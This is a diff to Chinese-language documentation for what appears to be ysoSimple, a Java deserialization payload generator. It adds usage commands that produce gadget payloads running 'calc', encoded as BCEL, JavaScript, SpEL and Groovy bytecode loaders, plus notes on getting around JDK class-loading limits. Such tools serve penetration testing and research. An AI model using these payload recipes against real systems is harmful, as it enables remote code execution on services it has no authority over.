@@ -3004,13 +3004,49 @@ rmi://127.0.0.1:1234/Basic
 
 工具：使用encode参数，后面跟着Base64，Hex，BCEL，JS-JavaCode，SPEL-JSCode-JavaCode，Groovy-JavaCode-UtilBase64，Groovy-JavaCode-MiscBase64，Groovy-JSCode-JavaCode
 
+#####  BCEL 编码
+
+```python
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "BCEL"
+```
+
+#####  ScriptEngineManager 表达式利用
+
+- JS-JavaCode：使用Classloader#defineClass进行类加载
+
+- JS-defineAnonymousClass-JavaCode：使用Unsafe类defineAnonymousClass方法进行类加载。不过这里需要注意，17>JDK>8时(JDK8及以下无此限制)，defineAnonymousClass做了限制，被加载的Class要满足两个条件之一：
+
+  1. 没有包名
+  2. 包名跟第一个参数Class的包名一致(在同一包下)，否则会报错
+
+  因为ysoSimple生成的字节码自动没有包名所以无需担心这个问题
+
+```bash
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "JS-JavaCode"
+
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "JS-defineAnonymousClass-JavaCode"
+```
+
+#####  SPEL 表达式利用
+
+- SPEL-JSCode-JavaCode
+- SPEL-JavaCode：用于JDK高版本下的利用
+
+```bash
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "SPEL-JSCode-JavaCode"
+```
+
+
+
+
+
+#####  Groovy 表达式利用
+
 - Groovy-JavaCode-UtilBase64：Groovy使用java.util.Base64解码字节码然后使用Unsafe进行字节码加载。
 - Groovy-JavaCode-MiscBase64：Groovy使用sun.misc.BASE64Decoder解码字节码然后使用Unsafe进行字节码加载。
 - Groovy-JSCode-JavaCode：Groovy使用ScriptEngineManager执行Java字节码
 
-```python
--m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "BCEL"
-
+```bash
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "Groovy-JavaCode-UtilBase64"
 
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "Groovy-JavaCode-MiscBase64"
